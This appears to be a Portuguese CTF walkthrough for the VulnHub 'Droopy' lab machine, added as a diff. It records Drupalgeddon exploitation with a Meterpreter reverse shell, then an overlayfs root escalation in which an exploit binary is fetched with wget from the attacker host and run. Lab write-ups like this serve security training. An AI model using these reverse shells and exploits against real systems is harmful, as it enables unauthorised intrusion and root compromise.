@@ -1,0 +1,155 @@
+RECON
+
+SCANNING:
+netdiscover
+192.168.1.101
+
+
+SEARCH EXPLOIT:
+searchsploit drupal
+Há muitos exploits que podem ser utilizados.
+
+
+PORTAS/SERVIÇOS:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+==============================================================================================================================
+
+EXPLORAÇÃO:
+
+EXPLOIT PARA DRUPAL:
+exploit/multi/http/drupal_drupageddon
+payload php/meterpreter/reverse_tcp
+
+Module options (exploit/multi/http/drupal_drupageddon):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The target URI of the Drupal installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
+
+msf5 exploit(multi/http/drupal_drupageddon) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.105:443 
+[*] Sending stage (38288 bytes) to 192.168.1.101
+[*] Meterpreter session 1 opened (192.168.1.105:443 -> 192.168.1.101:50691) at 2020-09-25 11:39:43 -0300
+
+meterpreter > sysinfo
+Computer    : droopy
+OS          : Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64
+Meterpreter : php/linux
+meterpreter > 
+meterpreter > shell
+Process 1142 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+==============================================================================================================================
+
+PÓS-EXPLORAÇÃO:
+
+exploit/linux/local/overlayfs_priv_esc
+session
+
+Module options (exploit/linux/local/overlayfs_priv_esc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (linux/x86/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   CVE-2015-8660
+
+
+
+Exploit manual:
+/usr/share/exploitdb/exploits/linux/local/37292.c
+cp 37292.c data.c
+gcc data.c -o data
+
+python -m SimpleHTTPServer 8080
+
+
+De volta ao metasploit:
+meterpreter > shell
+cd /tmp
+chmod +x data
+./data
+
+wget http://192.168.1.105:8080/data
+--2020-09-25 17:54:28--  http://192.168.1.105:8080/data
+Connecting to 192.168.1.105:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17600 (17K) [application/octet-stream]
+Saving to: 'data'
+
+     0K .......... .......                                    100%  163M=0s
+
+2020-09-25 17:54:28 (163 MB/s) - 'data' saved [17600/17600]
+
+ls
+data
+chmod +x data
+./data
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# hostname
+droopy
+# 
+
+
+
+Links:
+https://www.vulnhub.com/entry/droopy-v02,143/
+https://www.youtube.com/watch?v=8yIz4EynQNE
+https://thehackernews.com/search/label/Drupalgeddon
+https://cyware.com/news/what-is-drupalgeddon-and-what-kind-of-targets-does-it-go-after-78f558ec
+https://www.datalight.com/blog/2016/01/27/explaining-overlayfs-%E2%80%93-what-it-does-and-how-it-works/
+https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
+https://lwn.net/Articles/671641/
+https://www.exploit-db.com/exploits/37292
+https://www.cvedetails.com/cve/CVE-2015-1328/
+https://wiki.archlinux.org/index.php/Overlay_filesystem
+
+
